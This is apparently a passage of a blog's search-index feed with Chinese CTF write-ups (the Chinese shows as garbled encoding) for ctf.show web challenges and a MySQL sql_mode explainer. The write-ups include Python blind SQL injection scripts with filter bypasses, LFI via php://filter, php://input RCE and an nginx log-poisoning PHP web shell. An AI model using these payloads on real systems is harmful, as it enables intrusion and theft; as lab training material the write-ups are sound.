\</span><br><span class="line">              <span class="string">&quot;from information_schema.tables &quot;</span> \</span><br><span class="line">              <span class="string">&quot;where table_schema=database()&quot;</span> \</span><br><span class="line">              <span class="string">&quot;)=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line"></span><br><span class="line">        uri = url + sql</span><br><span class="line">        uri = uri.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&quot;length: &quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">length: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            k = <span class="built_in">ord</span>(j)</span><br><span class="line">            sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;select ascii(substr(&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;(select group_concat(table_name) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from information_schema.tables &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;where table_schema=database())&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;,&#123;0&#125;,1)&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;))=&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i, k)</span><br><span class="line">            <span class="comment"># print(sql)</span></span><br><span class="line">            uri = url + sql</span><br><span class="line">            uri = uri.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">            res = requests.get(url=uri)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                print(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># exit(-1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># getLength()</span></span><br><span class="line">    getData(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”¹å˜å…¶ä¸­<code>getDataå’ŒgetLengthä¸­çš„sqlè¯­å¥å°±å¯ä»¥å®ç°å¸ƒå°”ç›²æ³¨</code></p><p>ï¼ˆè¿‡æ»¤çš„æ›¿ä»£å‡½æ•°/ç¬¦å· ä¹‹åå•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ï¼‰</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013194156596.png" alt="image-20201013194156596"></p><p>æ‰“å¼€ä¹‹åå’Œä¸Šé¢˜ä¸€æ ·ï¼Œæ˜¯ä¸€ä¸ªç›²æ³¨</p><h3 id="é¢˜è§£-3"><a href="#é¢˜è§£-3" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>ä½†æ˜¯è¿™æ¬¡è¿‡æ»¤äº†é€—å·ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>substr</code>å‡½æ•°äº†ï¼Œæ›¿ä»£å“ä¸º<code>substring(xxx from 1)</code>ç”¨äºæˆªæ–­ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f677e55a-8e9d-45f6-9b48-1e3282696b60.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passby</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; str:</span></span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**a**/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>():</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./sql_fuzz&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        payload = i[:-<span class="number">1</span>]</span><br><span class="line">        uri = url + payload</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;sql&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">              <span class="string">&quot;select length(group_concat(flag)) &quot;</span> \</span><br><span class="line">              <span class="string">&quot;from flag &quot;</span> \</span><br><span class="line">              <span class="string">&quot;)=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        sql = passby(sql)</span><br><span class="line">        uri = url + sql</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(sql)</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakData</span>(<span class="params">length: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> string.printable:</span><br><span class="line">            payload = <span class="built_in">ord</span>(payload)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;select ascii(substring(&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;(select group_concat(flag) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from flag) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from &#123;0&#125;)&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;))=&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i, payload)</span><br><span class="line">            <span class="comment"># print(sql)</span></span><br><span class="line">            sql = passby(sql)</span><br><span class="line"></span><br><span class="line">            uri = url + sql</span><br><span class="line">            res = requests.get(url=uri)</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                print(<span class="built_in">chr</span>(payload), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># fuzz()</span></span><br><span class="line">    <span class="comment"># leakLength()</span></span><br><span class="line">    leakData(<span class="number">42</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> ctf-show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf.show é€šå…³è®°å½•(1)</title>
      <link href="/ctf-show01.html"/>
      <url>/ctf-show01.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf.show/">ctf.show</a>å¹³å°web 1-4</p><a id="more"></a><h2 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924081327768.png" alt="image-20200924081327768"></p><p>ä¸€é“ç­¾åˆ°é¢˜</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æ‰“å¼€å®¹å™¨</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082055850.png"></p><p><code>F12</code>æŸ¥çœ‹æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where is flag?</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">ZmxhZ3swNzc4NGQ5My04YTJkLTRmZjktYWVlYy0yMDdjMTllNTBhMmN9--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æœ‰ä¸€ä¸²<code>base64</code>åŠ å¯†çš„ç©æ„</p><p>è§£å¯†ä¹‹å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082223263.png" alt="image-20200924082223263"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082349245.png" alt="image-20200924082349245"></p><p>è¯´æ˜¯ä¸€ä¸ª<code>sqlæ³¨å…¥</code></p><h3 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æ‰“å¼€å®¹å™¨ï¼Œæ˜¯ç†Ÿæ‚‰çš„ç™»å½•æ¡†</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082433112.png" alt="image-20200924082433112"></p><p>ä½¿ç”¨ä¸‡èƒ½å¯†ç è¯•è¯•ç™»å½•</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082707666.png" alt="image-20200924082707666"></p><p>æˆåŠŸäº†ï¼Œè¯´æ˜å­˜åœ¨<code>sqlæ³¨å…¥</code></p><p>çˆ†ç ´ä¸€ä¸‹å­—æ®µæ•°é‡</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083134289.png" alt="image-20200924083134289"></p><p>å­—æ®µæ˜¯ä¸‰ä¸ªï¼Œå›æ˜¾æ˜¯ç¬¬äºŒä¸ª</p><p>ç„¶åæ³¨å…¥ç¬¬äºŒä¸ªç‚¹ï¼Œå¾—åˆ°æ‰€æœ‰çš„æ•°æ®åº“å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083320142.png" alt="image-20200924083320142"></p><p>ç„¶åçˆ†å‡ºè¡¨å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083426195.png" alt="image-20200924083426195"></p><p>å¾—åˆ°åˆ—å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083610703.png" alt="image-20200924083610703"></p><p>æœ€åå¾—åˆ°æ•°æ®</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083705363.png" alt="image-20200924083705363"></p><p>å¾—åˆ°äº†flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083800080.png" alt="image-20200924083800080"></p><h3 id="é¢˜è§£-2"><a href="#é¢˜è§£-2" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ç»™äº†éƒ¨åˆ†ä»£ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084144615.png"></p><p>æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><p>ä½¿ç”¨phpä¼ªåè®®è¯»å–æºç </p><p><code>?url=php://filter/convert.base64-encode/resource=index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$url&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">if(isset($url))&#123;</span><br><span class="line">    include($url);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, minimum-scale&#x3D;1.0, maximum-scale&#x3D;1.0, initial-scale&#x3D;1.0&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web3&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web3&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">            </span><br><span class="line">            $code&#x3D;&quot;&lt;?php include($&quot;.&quot;_GET[&#39;url&#39;]);?&gt;&quot;;</span><br><span class="line">            highlight_string($code);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å¥½å§ï¼Œä¹Ÿæ²¡å•¥ç©æ„</p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œè¿˜æœ‰ä¸€ä¸ª<code>php://input</code>ä¼ªåè®®å¯ä»¥RCE</p><p><code>?url=php://input</code></p><p>åŠ ä¸Šæ•°æ®<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084649521.png" alt="image-20200924084649521"></p><p>å¾—åˆ°flag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084747712.png" alt="image-20200924084747712"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084855805.png" alt="image-20200924084855805"></p><h3 id="é¢˜è§£-3"><a href="#é¢˜è§£-3" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æ‰“å¼€å®¹å™¨</p><p>å‘ç°å’Œweb3ä¸€æ ·</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084938689.png" alt="image-20200924084938689"></p><p>ä½†æ˜¯è¿‡æ»¤äº†<code>php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085037365.png" alt="image-20200924085037365"></p><p>æ‰€ä»¥ä¸èƒ½<code>php</code>ä¼ªåè®®äº†</p><p>åç«¯æœåŠ¡å™¨ä¸º<code>nginx</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085325509.png" alt="image-20200924085325509"></p><p>æ‰¾ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶</p><p><code>?url=/var/log/nginx/access.log</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085310923.png" alt="image-20200924085310923"></p><p>æˆåŠŸåŒ…å«æ—¥å¿—æ–‡ä»¶</p><p>åœ¨UAå¤´æ’å…¥<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085637490.png" alt="image-20200924085637490"></p><p>æˆåŠŸRCE</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085604290.png" alt="image-20200924085604290"></p><p>å¾—åˆ°flag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085712021.png" alt="image-20200924085712021"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> ctf-show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql_modeä»‹ç»</title>
      <link href="/sql_mode.html"/>
      <url>/sql_mode.html</url>
      
        <content type="html"><![CDATA[<p><code>sql_mode</code>ï¼šå®šä¹‰äº†<code>sql</code>çš„çº¦æŸè§„åˆ™ï¼Ÿï¼ˆå¤§æ¦‚ï¼‰</p><a id="more"></a><h1 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h1><p>åœ¨buuåˆ·é¢˜çš„æ—¶å€™ï¼ŒæŸé“sqlæ³¨å…¥é¢˜ä½¿ç”¨äº†<code>sql_mode=pipes_as_concat</code>ï¼Œä¸è§£ï¼Œäºæ˜¯æŸ¥æ‰¾èµ„æ–™ï¼Œå­¦ä¹ <code>sql_mode</code></p><h2 id="æŸ¥çœ‹ç°åœ¨ä½¿ç”¨çš„sql-mode"><a href="#æŸ¥çœ‹ç°åœ¨ä½¿ç”¨çš„sql-mode" class="headerlink" title="æŸ¥çœ‹ç°åœ¨ä½¿ç”¨çš„sql_mode"></a>æŸ¥çœ‹ç°åœ¨ä½¿ç”¨çš„sql_mode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@sql_mode;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922191341938.png" alt="image-20200922191341938"></p><p>å…¶ä¸­å€¼è¡¨ç¤ºå•¥ä¸‹é¢ä¼šè®²</p><h2 id="sql-mode-å€¼çš„æ„ä¹‰"><a href="#sql-mode-å€¼çš„æ„ä¹‰" class="headerlink" title="sql_mode å€¼çš„æ„ä¹‰"></a>sql_mode å€¼çš„æ„ä¹‰</h2><h3 id="ONLY-FULL-GROUP-BY"><a href="#ONLY-FULL-GROUP-BY" class="headerlink" title="ONLY_FULL_GROUP_BY"></a>ONLY_FULL_GROUP_BY</h3><h4 id="è§£é‡Šï¼Ÿ"><a href="#è§£é‡Šï¼Ÿ" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><p>å¯¹äº<code>GROUP BY</code>èšåˆæ“ä½œï¼Œå¦‚æœåœ¨SELECTä¸­çš„åˆ—ï¼Œ<strong>æ²¡æœ‰åœ¨<code>GROUP BY</code>ä¸­å‡ºç°</strong>ï¼Œé‚£ä¹ˆå°†è®¤ä¸ºè¿™ä¸ªSQLæ˜¯ä¸åˆæ³•çš„ï¼Œå› ä¸ºåˆ—ä¸åœ¨<code>GROUP BY</code>ä»å¥ä¸­</p><h4 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192455629.png" alt="image-20200922192455629" style="zoom:50%;" /><p>å¼€å¯äº†**<code>ONLY_FULL_GROUP_BY</code>**</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192059464.png" alt="image-20200922192059464"></p><p>å‡ºç°äº†æŠ¥é”™ï¼Œå› ä¸º<code>id</code>å’Œ<code>password</code>å­—æ®µ<strong>å¹¶ä¸åœ¨<code>group by list</code>ï¼ˆgroup by åé¢è·Ÿçš„å­—æ®µï¼‰ä¸­</strong>ï¼Œå¦‚æœ<code>select list</code>å’Œ<code>group by list</code>ç›¸åŒï¼Œåˆ™ä¸ä¼šæŠ¥é”™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192830898.png" alt="image-20200922192830898"></p><h3 id="STRICT-TRANS-TABLES-amp-amp-STRICT-ALL-TABLES"><a href="#STRICT-TRANS-TABLES-amp-amp-STRICT-ALL-TABLES" class="headerlink" title="STRICT_TRANS_TABLES &amp;&amp; STRICT_ALL_TABLES"></a>STRICT_TRANS_TABLES &amp;&amp; STRICT_ALL_TABLES</h3><h4 id="è§£é‡Šï¼Ÿ-1"><a href="#è§£é‡Šï¼Ÿ-1" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><p>ä¸¥æ ¼æ¨¡å¼ï¼š</p><blockquote><p>åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œä¸€æ—¦ä»»ä½•æ“ä½œçš„æ•°æ®äº§ç”Ÿé—®é¢˜ï¼Œéƒ½å°†ç»ˆæ­¢å½“å‰çš„æ“ä½œï¼Œå¯¹äºå¯ç”¨STRICT_ALL_TABLESçš„éäº‹åŠ¡å¼•æ“è€Œè¨€ï¼Œè¿™æ—¶æ•°æ®å¯èƒ½åœç•™åœ¨ä¸€ä¸ªæœªçŸ¥çš„çŠ¶æ€ï¼Œå› æ­¤éœ€éå¸¸å°å¿ƒè¿™ä¸ªé€‰é¡¹å¯èƒ½å¸¦æ¥çš„æ½œåœ¨å½±å“ã€‚</p></blockquote><p><strong>STRICT_TRANS_TALESï¼ˆä¸¥æ ¼æ¨¡å¼ï¼‰ï¼š</strong><br>åªå¯¹æ”¯æŒäº‹åŠ¡çš„è¡¨å¯ç”¨ä¸¥æ ¼æ¨¡å¼</p><p><strong>STRICT_ALL_TABLESï¼ˆä¸¥æ ¼æ¨¡å¼ï¼‰ï¼š</strong><br>å¯¹æ‰€æœ‰å¼•æ“çš„è¡¨éƒ½å¯ç”¨ä¸¥æ ¼æ¨¡å¼</p><h4 id="ä¸¾ä¾‹ï¼š-1"><a href="#ä¸¾ä¾‹ï¼š-1" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922193512075.png" alt="image-20200922193512075" style="zoom:50%;" /><p>å¼€å¯äº†<code>strict_all_tables</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922194001026.png" alt="image-20200922194001026"></p><p>å¯ä»¥çœ‹åˆ°å½“æ•°æ®ç±»å‹ä¸åŒ¹é…çš„æ—¶å€™æ’å…¥ä¸äº†ï¼ˆä¸Šé¢çš„çº¢è‰²æ¡†æ¡†ï¼‰</p><p>å»é™¤è¿™ä¸ª<code>sql_mode</code>çš„æ—¶å€™å°±å¯ä»¥æ’å…¥ï¼Œ(ä¼šè¿›è¡Œç±»å‹è½¬æ¢)</p><h3 id="NO-ZERO-IN-DATE-amp-amp-NO-ZERO-DATE"><a href="#NO-ZERO-IN-DATE-amp-amp-NO-ZERO-DATE" class="headerlink" title="NO_ZERO_IN_DATE &amp;&amp; NO_ZERO_DATE"></a>NO_ZERO_IN_DATE &amp;&amp; NO_ZERO_DATE</h3><h4 id="è§£é‡Šï¼Ÿ-2"><a href="#è§£é‡Šï¼Ÿ-2" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><ul><li><p><strong><code>NO_ZERO_IN_DATE</code></strong></p><p>  åœ¨ä¸¥æ ¼æ¨¡å¼ï¼Œ<strong>ä¸æ¥å—æœˆæˆ–æ—¥éƒ¨åˆ†ä¸º<code>0</code>çš„æ—¥æœŸ</strong>ã€‚å¦‚æœä½¿ç”¨<code>IGNORE</code>é€‰é¡¹ï¼Œæˆ‘ä»¬ä¸ºç±»ä¼¼çš„æ—¥æœŸæ’å…¥**<code>&#39;0000-00-00&#39;</code>**ã€‚åœ¨éä¸¥æ ¼æ¨¡å¼ï¼Œå¯ä»¥æ¥å—è¯¥æ—¥æœŸï¼Œä½†ä¼šç”Ÿæˆè­¦å‘Šã€‚</p></li><li><p><strong><code>NO_ZERO_DATE</code></strong></p><p>  åœ¨ä¸¥æ ¼æ¨¡å¼ï¼Œ<strong>ä¸è¦å°†<code> &#39;0000-00-00&#39;</code>åšä¸ºåˆæ³•æ—¥æœŸ</strong>ã€‚ä½ ä»ç„¶å¯ä»¥ç”¨IGNOREé€‰é¡¹æ’å…¥é›¶æ—¥æœŸã€‚åœ¨éä¸¥æ ¼æ¨¡å¼ï¼Œå¯ä»¥æ¥å—è¯¥æ—¥æœŸï¼Œä½†ä¼šç”Ÿæˆè­¦å‘Š</p></li></ul><h4 id="ä¸¾ä¾‹ï¼š-2"><a href="#ä¸¾ä¾‹ï¼š-2" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922194333853.png" alt="image-20200922194333853" style="zoom:50%;" /><p>æ²¡æœ‰åŠ å…¥**<code>NO_ZERO_IN_DATE</code>**</p><p>é¡ºåˆ©çš„æ’å…¥äº†<code>0000-00-00</code>ä½œä¸ºå€¼</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195014020.png" alt="image-20200922195014020"></p><p><code>1000-00-00</code>ä¹Ÿé¡ºåˆ©å†™å…¥<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195031997.png"></p><p>ä¿®æ”¹<code>sql_mode</code>ï¼ŒåŠ å…¥<code>NO_ZERO_IN_DATE</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195242239.png" alt="image-20200922195242239"></p><p>æ— æ³•æ’å…¥æ•°æ®</p><h3 id="ERROR-FOR-DIVISION-BY-ZERO"><a href="#ERROR-FOR-DIVISION-BY-ZERO" class="headerlink" title="ERROR_FOR_DIVISION_BY_ZERO"></a>ERROR_FOR_DIVISION_BY_ZERO</h3><h4 id="è§£é‡Šï¼Ÿ-3"><a href="#è§£é‡Šï¼Ÿ-3" class="headerlink" title="è§£é‡Šï¼Ÿ"></a>è§£é‡Šï¼Ÿ</h4><p>çœ‹åå­—å°±çŸ¥é“äº†ï¼ˆå¤§æ¦‚ï¼‰</p><p>åœ¨ä¸¥æ ¼æ¨¡å¼ï¼Œåœ¨<code>INSERT</code>æˆ–<code>UPDATE</code>è¿‡ç¨‹ä¸­ï¼Œ**å¦‚æœè¢«é›¶é™¤(æˆ–MOD(Xï¼Œ0))ï¼Œåˆ™äº§ç”Ÿé”™è¯¯(å¦åˆ™ä¸ºè­¦å‘Š)**ã€‚å¦‚æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œè¢«é›¶é™¤æ—¶MySQLè¿”å›NULLã€‚å¦‚æœç”¨åˆ°<code>INSERT IGNORE</code>æˆ–<code>UPDATE IGNORE</code>ä¸­ï¼ŒMySQLç”Ÿæˆè¢«é›¶é™¤è­¦å‘Šï¼Œä½†æ“ä½œç»“æœä¸ºNULLã€‚</p><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" 